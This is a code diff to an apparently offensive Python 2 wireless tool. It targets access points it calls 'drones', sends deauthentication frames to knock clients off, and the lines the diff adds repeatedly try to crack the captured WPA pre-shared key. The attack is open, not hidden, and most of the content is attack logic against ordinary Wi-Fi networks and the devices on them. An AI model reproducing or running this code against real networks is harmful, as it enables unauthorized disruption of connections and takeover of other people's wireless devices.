@@ -39,8 +39,8 @@ class Environment:
             self.__startmonitormode(index)
             self.__gettargets(index)
             self.__deauthtargets()
-            #self.__capturepsk(index)
-            #self.__stopmonitormode()
+            self.__crackpsk(index)
+            self.__stopmonitormode()
         else:
             print 'Out of bounds! Only ' + len(self.accesspoints) + ' drones found.'
             
@@ -69,15 +69,19 @@ class Environment:
             commands.deauth(self.mondevice, target.accesspoint.mac, target.mac)
     
     
-    def __capturepsk(self, index):
+    def __crackpsk(self, index):
         
-        accesspoint = self.accesspoints[index]
-        #commands.cleanfiles(accesspoint.dumpfilename, wildcard=True)
-        commands.sniffssid(self.mondevice, accesspoint.ssid, accesspoint.channel, accesspoint.dumpfilename + '-01')
-        
-        time.sleep(10)
-    
-    
+        out = 'No valid WPA handshakes found'
+        for x in range(5):
+            if ('No valid WPA handshakes found' not in out) or x > 4:
+                print out
+                break
+            else:
+                accesspoint = self.accesspoints[index]   
+                out = commands.crackpsk(accesspoint.mac, accesspoint.dumpfilename)
+                time.sleep(5)
+                print 'No handshake found. Still searching...'
+      
     def __gettargets(self, index):
         
         accesspoint = self.accesspoints[index]
